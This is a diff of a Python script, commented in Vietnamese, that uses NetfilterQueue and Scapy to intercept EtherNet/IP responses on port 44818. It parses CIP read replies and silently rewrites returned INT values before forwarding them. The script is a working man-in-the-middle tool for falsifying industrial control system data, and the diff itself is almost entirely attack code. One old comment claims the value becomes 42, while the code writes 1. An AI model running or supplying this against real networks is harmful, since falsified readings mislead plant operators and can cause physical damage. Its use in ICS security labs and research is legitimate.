@@ -1,34 +1,35 @@
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
 
-def process_packet(packet):
-    scapy_pkt = IP(packet.get_payload())  # Chuyển gói tin sang Scapy
-    if scapy_pkt.haslayer(Raw):  # Kiểm tra gói tin có chứa payload
-        raw_data = scapy_pkt[Raw].load  # Truy cập payload
+def modify_packet(packet):
+    scapy_pkt = IP(packet.get_payload())  # Chuyển gói tin sang định dạng Scapy
+    
+    if scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].sport == 44818:  # ENIP Response
+        data = bytes(scapy_pkt[TCP].payload)
+        if data[0:2] == b"\x6f\x00":  # Kiểm tra ENIP Send RR Data
+            # Kiểm tra cấu trúc ENIP + CIP
+            if data[30:32] == b"\x02\x00" and data[32:34] == b"\x00\x00" and \
+               data[34:36] == b"\x00\x00" and data[36:38] == b"\xb2\x00":
+                # CIP packet bắt đầu tại offset 40
+                if data[40:42] == b"\xcc\x00" and data[42:44] == b"\x00\x00":
+                    if data[44:46] == b"\xc3\x00":  # INT datatype
+                        print("Modifying CIP INT data...")
+                        # Sửa đổi giá trị INT tại offset 46
+                        modified_data = data[:46] + b"\x01\x00" + data[48:]
+                        scapy_pkt[TCP].remove_payload()
+                        scapy_pkt = scapy_pkt / modified_data
+                        del scapy_pkt[IP].chksum  # Xóa checksum IP
+                        del scapy_pkt[TCP].chksum  # Xóa checksum TCP
+                        packet.set_payload(bytes(scapy_pkt))  # Cập nhật gói tin
+    packet.accept()  # Chấp nhận gói tin và gửi đi
 
-        # Kiểm tra ENIP và CIP trong payload
-        if raw_data[:2] == b"\x6f\x00":  # Header ENIP Send RR Data
-            if raw_data[30:32] == b"\x02\x00" and raw_data[32:36] == b"\x00\x00\x00\x00" and raw_data[36:38] == b"\xb2\x00":
-                # Xác định header CIP (bắt đầu từ byte 40)
-                cip_start = 40
-                if raw_data[cip_start:cip_start+2] == b"\xcc\x00" and raw_data[cip_start+4:cip_start+6] == b"\xc3\x00":
-                    # CIP response with INT type
-                    print(f"Original CIP Raw Data: {raw_data}")
-                    # Sửa đổi giá trị INT thành 42 (0x2a)
-                    modified_data = raw_data[:cip_start+6] + b"\x01\x00" + raw_data[cip_start+8:]
-                    scapy_pkt[Raw].load = modified_data
-                    del scapy_pkt[IP].chksum  # Xóa checksum để Scapy tự tính toán lại
-                    del scapy_pkt[TCP].chksum
-                    packet.set_payload(bytes(scapy_pkt))  # Ghi đè payload
-                    print(f"Modified CIP Raw Data: {scapy_pkt[Raw].load}")
-
-    packet.accept()  # Chấp nhận và chuyển tiếp gói tin
-
-# Tạo hàng đợi và xử lý
+# Gắn hàng đợi NetfilterQueue
 nfqueue = NetfilterQueue()
-nfqueue.bind(1, process_packet)  # Gắn hàng đợi số 1 với hàm xử lý
+nfqueue.bind(1, modify_packet)  # Sử dụng hàng đợi số 1
+
 try:
-    nfqueue.run()  # Chạy chương trình
+    print("Starting NetfilterQueue...")
+    nfqueue.run()  # Chạy hàng đợi
 except KeyboardInterrupt:
     print("Exiting...")
     nfqueue.unbind()
